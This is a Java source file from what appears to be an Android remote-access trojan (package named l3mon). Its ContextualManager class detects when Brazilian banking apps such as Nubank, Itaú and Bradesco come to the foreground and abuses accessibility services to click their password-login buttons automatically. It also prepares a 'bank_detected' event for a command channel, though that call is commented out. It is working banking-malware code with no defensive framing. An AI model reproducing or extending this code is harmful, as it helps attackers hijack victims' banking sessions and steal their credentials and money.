package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;
import org.json.JSONObject;
import java.util.HashMap;
import java.util.Map;

public class ContextualManager {

    private static final Map<String, String> BANK_PACKAGES = new HashMap<>();
    private String lastDetectedBank = "";

    static {
        BANK_PACKAGES.put("itau", "com.itau");
        BANK_PACKAGES.put("bradesco", "com.bradesco");
        BANK_PACKAGES.put("caixa", "com.caixa");
        BANK_PACKAGES.put("nubank", "com.nubank");
        BANK_PACKAGES.put("bb", "com.bb");
        BANK_PACKAGES.put("santander", "com.santander");
        BANK_PACKAGES.put("inter", "br.com.inter");
        BANK_PACKAGES.put("c6", "com.c6bank");
        BANK_PACKAGES.put("next", "com.next");
        BANK_PACKAGES.put("picpay", "com.picpay");
        BANK_PACKAGES.put("neon", "com.neon");
    }

    public String detectBankApp(String foregroundPackage) {
        if (foregroundPackage == null)
            return null;

        for (Map.Entry<String, String> entry : BANK_PACKAGES.entrySet()) {
            if (foregroundPackage.contains(entry.getValue())) {
                return entry.getKey();
            }
        }
        return null;
    }

    public void onBankDetected(String bankName, AccessibilityNodeInfo root) {
        if (bankName == null || root == null)
            return;
        if (bankName.equals(lastDetectedBank))
            return;

        lastDetectedBank = bankName;

        try {
            JSONObject event = new JSONObject();
            event.put("action", "bank_detected");
            event.put("bank", bankName.toUpperCase());
            event.put("timestamp", System.currentTimeMillis());

            // ConnectionManager.ioSocket.emit("0xCTX", event);

            // Ações automáticas por banco
            switch (bankName.toLowerCase()) {
                case "nubank":
                    clickIfExists(root, "entrar com senha");
                    clickIfExists(root, "usar senha");
                    break;
                case "itau":
                    clickIfExists(root, "acessar com senha");
                    clickIfExists(root, "continuar");
                    break;
                case "bradesco":
                case "caixa":
                case "bb":
                    clickIfExists(root, "acessar");
                    clickIfExists(root, "entrar");
                    break;
                default:
                    clickIfExists(root, "entrar");
                    clickIfExists(root, "acessar");
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean clickIfExists(AccessibilityNodeInfo node, String text) {
        if (node == null)
            return false;

        String nodeText = node.getText() != null ? node.getText().toString().toLowerCase() : "";
        String desc = node.getContentDescription() != null ? node.getContentDescription().toString().toLowerCase() : "";

        if ((nodeText.contains(text) || desc.contains(text)) && node.isClickable()) {
            node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            return true;
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                if (clickIfExists(child, text)) {
                    child.recycle();
                    return true;
                }
                child.recycle();
            }
        }
        return false;
    }

    public void resetLastDetectedBank() {
        lastDetectedBank = "";
    }
}